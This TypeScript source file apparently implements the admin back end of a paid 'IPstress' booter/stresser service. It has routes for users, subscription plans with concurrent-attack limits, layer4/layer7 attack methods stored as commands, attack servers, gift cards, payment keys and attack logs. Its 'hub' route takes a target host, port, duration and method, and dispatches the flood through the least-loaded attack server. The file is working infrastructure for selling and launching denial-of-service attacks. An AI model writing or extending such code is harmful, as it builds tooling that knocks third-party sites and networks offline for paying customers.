/**
 * WEB ADMIN ROUTES - every /web/admin/* page + CRUD API.
 * All routes carry the webAdmin guard. Data mutations follow the legacy
 * action=create/update/delete protocol via hidden form fields.
 */

import { Application } from '../core/01-application';
import { HttpError } from '../core/09-errors';
import { webDb } from '../lib/db/web';
import { render } from '../core/views';
import bcrypt from 'bcryptjs';

type Body = Record<string, unknown>;

function str(body: Body, key: string, fallback = ''): string {
    return String(body[key] ?? fallback);
}
function num(body: Body, key: string, fallback = 0): number {
    return Number(body[key] ?? fallback) || fallback;
}

export function registerWebAdminRoutes(app: Application): void {
    app.get(
        '/web/admin/dashboard',
        async (ctx) => {
            const [totalUsers, activeUsers, totalAttacks, runningAttacks, waitingTickets] =
                await Promise.all([
                    webDb.users.count(),
                    webDb.users.count({ where: { membership: { not: 0 } } }),
                    webDb.logs.count(),
                    webDb.logs.count({ where: { stopped: 0, time: { gt: 0 } } }),
                    webDb.tickets.count({ where: { status: 'Waiting for admin response' } }),
                ]);
            ctx.htmlRaw(
                render('web-admin-dashboard', {
                    s: { totalUsers, activeUsers, totalAttacks, runningAttacks, waitingTickets },
                })
            );
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/users',
        async (ctx) => {
            const users = await webDb.users.findMany();
            ctx.htmlRaw(render('web-admin-users', { users }));
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/users/:id',
        async (ctx) => {
            const id = Number(ctx.params.id);
            const [user, plans] = await Promise.all([
                webDb.users.findUnique({ where: { ID: id } }),
                webDb.plans.findMany({ select: { ID: true, name: true } }),
            ]);
            if (!user) ctx.throw(404, 'User not found');
            ctx.htmlRaw(render('web-admin-user-edit', { user, plans }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/users',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            const id = num(body, 'id');
            if (!id) throw new HttpError(400, 'Missing user id.');
            if (str(body, 'action') === 'update') {
                const data: Record<string, string | number> = {
                    username: str(body, 'username'),
                    rank: num(body, 'rank'),
                    membership: num(body, 'membership'),
                    expire: num(body, 'expire'),
                };
                const pw = str(body, 'password');
                if (pw) data.password = await bcrypt.hash(pw, 12);
                await webDb.users.update({ where: { ID: id }, data });
                ctx.json({ success: 'User updated.' });
            } else if (str(body, 'action') === 'delete') {
                await webDb.users.delete({ where: { ID: id } });
                ctx.json({ success: 'User deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/plans',
        async (ctx) => {
            const plans = await webDb.plans.findMany({ orderBy: { price: 'asc' } });
            ctx.htmlRaw(render('web-admin-plans', { plans }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/plans',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            if (str(body, 'action') === 'create') {
                await webDb.plans.create({
                    data: {
                        name: str(body, 'name'),
                        price: num(body, 'price'),
                        length: num(body, 'length'),
                        mbt: num(body, 'mbt'),
                        concurrents: num(body, 'concurrents'),
                        vip: num(body, 'vip'),
                        unit: 'days',
                        private: 0,
                    },
                });
                ctx.json({ success: 'Plan created.' });
            } else if (str(body, 'action') === 'delete') {
                await webDb.plans.delete({ where: { ID: num(body, 'id') } });
                ctx.json({ success: 'Plan deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/methods',
        async (ctx) => {
            const methods = await webDb.methods.findMany({ orderBy: { type: 'asc' } });
            ctx.htmlRaw(render('web-admin-methods', { methods }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/methods',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            if (str(body, 'action') === 'create') {
                await webDb.methods.create({
                    data: {
                        name: str(body, 'name'),
                        fullname: str(body, 'fullname'),
                        type: str(body, 'type'),
                        command: str(body, 'command'),
                    },
                });
                ctx.json({ success: 'Method added.' });
            } else if (str(body, 'action') === 'delete') {
                await webDb.methods.delete({ where: { id: num(body, 'id') } });
                ctx.json({ success: 'Method deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/news',
        async (ctx) => {
            const news = await webDb.news.findMany({ orderBy: { ID: 'desc' } });
            ctx.htmlRaw(render('web-admin-news', { news }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/news',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            if (str(body, 'action') === 'create') {
                await webDb.news.create({
                    data: {
                        title: str(body, 'title'),
                        content: str(body, 'content'),
                        date: new Date().toISOString().slice(0, 10),
                    },
                });
                ctx.json({ success: 'Announcement published.' });
            } else if (str(body, 'action') === 'delete') {
                await webDb.news.delete({ where: { ID: num(body, 'id') } });
                ctx.json({ success: 'Announcement deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/servers',
        async (ctx) => {
            const servers = await webDb.api.findMany({ orderBy: { name: 'asc' } });
            ctx.htmlRaw(render('web-admin-servers', { servers }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/servers',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            if (str(body, 'action') === 'create') {
                await webDb.api.create({
                    data: {
                        name: str(body, 'name'),
                        ip: str(body, 'ip'),
                        api: '',
                        password: str(body, 'password'),
                        slots: num(body, 'slots', 10),
                        methods: str(body, 'methods', ''),
                        vip: 0,
                    },
                });
                ctx.json({ success: 'Server added.' });
            } else if (str(body, 'action') === 'delete') {
                await webDb.api.delete({ where: { id: num(body, 'id') } });
                ctx.json({ success: 'Server deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/giftcards',
        async (ctx) => {
            const [cards, plans] = await Promise.all([
                webDb.giftcards.findMany({ orderBy: { ID: 'desc' } }),
                webDb.plans.findMany({ select: { ID: true, name: true } }),
            ]);
            ctx.htmlRaw(render('web-admin-giftcards', { cards, plans }));
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/giftcards',
        async (ctx) => {
            const body = (await ctx.body()) as Body;
            if (str(body, 'action') === 'generate') {
                const planID = num(body, 'planID');
                const count = Math.min(num(body, 'count', 1), 100);
                const now = Math.floor(Date.now() / 1000);
                for (let i = 0; i < count; i++) {
                    const code =
                        'GC-' +
                        Math.random().toString(36).substring(2, 8).toUpperCase() +
                        '-' +
                        Math.random().toString(36).substring(2, 8).toUpperCase();
                    await webDb.giftcards.create({
                        data: { code, planID, claimedby: 0, dateClaimed: 0, date: now },
                    });
                }
                ctx.json({ success: `${count} gift card(s) generated.` });
            } else if (str(body, 'action') === 'delete') {
                await webDb.giftcards.delete({ where: { ID: num(body, 'id') } });
                ctx.json({ success: 'Gift card deleted.' });
            } else throw new HttpError(400, 'Unknown action.');
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/tickets',
        async (ctx) => {
            const tickets = await webDb.tickets.findMany({ orderBy: { date: 'desc' } });
            ctx.htmlRaw(render('web-admin-tickets', { tickets }));
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/attacklogs',
        async (ctx) => {
            const logs = await webDb.logs.findMany({ orderBy: { date: 'desc' } });
            ctx.htmlRaw(render('web-admin-attacklogs', { logs: logs.slice(0, 200) }));
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/loginlogs',
        async (ctx) => {
            const logs = await webDb.loginlogs.findMany({ orderBy: { date: 'desc' } });
            ctx.htmlRaw(render('web-admin-loginlogs', { logs: logs.slice(0, 200) }));
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/hub',
        async (ctx) => {
            const methods = await webDb.methods.findMany({ orderBy: { name: 'asc' } });
            const typed = methods as Array<{ name: string; fullname: string; type: string }>;
            ctx.htmlRaw(
                render('web-admin-hub', {
                    layer4: typed.filter((m) => m.type === 'layer4'),
                    layer7: typed.filter((m) => m.type === 'layer7'),
                    servers: await webDb.api.findMany({ select: { name: true, slots: true } }),
                })
            );
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/hub',
        async (ctx) => {
            const f = await ctx.form();
            const host = f.host?.trim();
            const port = f.port?.trim() || '80';
            const timeStr = f.time?.trim();
            const methodName = f.method?.trim();
            if (!host || !timeStr || !methodName) {
                throw new HttpError(400, 'Host, time, and method are required.');
            }
            const attackTime = parseInt(timeStr, 10);
            if (isNaN(attackTime) || attackTime <= 0 || attackTime > 3600) {
                throw new HttpError(400, 'Invalid attack time.');
            }
            const portNum = parseInt(port, 10);
            if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
                throw new HttpError(400, 'Invalid port. Must be between 1 and 65535.');
            }
            const now = Math.floor(Date.now() / 1000);
            const apiServers = await webDb.api.findMany();
            const matching = (
                apiServers as Array<{ name: string; api: string; methods: string; slots: number }>
            ).filter((s) =>
                s.methods
                    .split(',')
                    .map((m) => m.trim().toUpperCase())
                    .includes(methodName.toUpperCase())
            );
            if (matching.length === 0) {
                throw new HttpError(400, 'No API server supports the selected method.');
            }
            let best = matching[0];
            let lowest = Infinity;
            for (const s of matching) {
                const activeOnServer = await webDb.logs.count({
                    where: { stopped: 0, handler: s.name, time: { gt: 0 } },
                });
                const available = s.slots - activeOnServer;
                if (available > 0 && activeOnServer < lowest) {
                    lowest = activeOnServer;
                    best = s;
                }
            }
            if (lowest === Infinity) {
                ctx.json({ error: 'All API servers are at full capacity.' }, 429);
                return;
            }
            const attackUrl = best.api
                .replace(/\[host\]/gi, host)
                .replace(/\[port\]/gi, port)
                .replace(/\[time\]/gi, String(attackTime))
                .replace(/\[method\]/gi, methodName);
            let ok = false;
            try {
                const res = await fetch(attackUrl, {
                    method: 'GET',
                    signal: AbortSignal.timeout(10000),
                });
                ok = res.ok;
            } catch {
                /* logged regardless */
            }
            await webDb.logs.create({
                data: {
                    user: 'admin',
                    ip: host,
                    time: attackTime,
                    method: methodName,
                    postdata: port,
                    mode: 'api',
                    ratelimit: '0',
                    cookie: '0',
                    date: now,
                    chart: new Date(now * 1000).toISOString().slice(0, 19).replace('T', ' '),
                    stopped: 0,
                    handler: best.name,
                    origin: 'admin',
                },
            });
            if (!ok) {
                ctx.json(
                    { error: 'Attack was logged but the API server may be unreachable.' },
                    500
                );
                return;
            }
            ctx.json({
                success: `Attack launched on ${host}:${port} for ${attackTime}s using ${methodName}.`,
            });
        },
        { guard: 'webAdmin' }
    );

    app.get(
        '/web/admin/settings',
        async (ctx) => {
            const s = await webDb.settings.findFirst();
            ctx.htmlRaw(
                render('web-admin-settings', {
                    s: {
                        sitename: s?.sitename ?? 'IPstress',
                        url: s?.url ?? '',
                        description: s?.description ?? '',
                        cooldown: s?.cooldown ?? 60,
                        cooldownTime: s?.cooldownTime ?? 300,
                        maxattacks: s?.maxattacks ?? 5,
                        testboots: s?.testboots ?? 1,
                    },
                })
            );
        },
        { guard: 'webAdmin' }
    );

    app.post(
        '/web/api/admin/settings',
        async (ctx) => {
            const body = (await ctx.body()) as Record<string, string>;
            const existing = await webDb.settings.findFirst();
            if (!existing) throw new HttpError(404, 'Settings row not found.');
            const updatable = [
                'sitename',
                'url',
                'description',
                'cooldown',
                'cooldownTime',
                'maxattacks',
                'testboots',
                'paypal',
                'bitcoin',
                'stripePubKey',
                'stripeSecretKey',
            ] as const;
            const update: Record<string, string | number> = {};
            for (const key of updatable) {
                if (body[key] !== undefined) update[key] = body[key];
            }
            if (Object.keys(update).length > 0) {
                await webDb.settings.update({
                    where: { sitename: existing.sitename },
                    data: update,
                });
            }
            ctx.json({ success: 'Settings saved.' });
        },
        { guard: 'webAdmin' }
    );
}
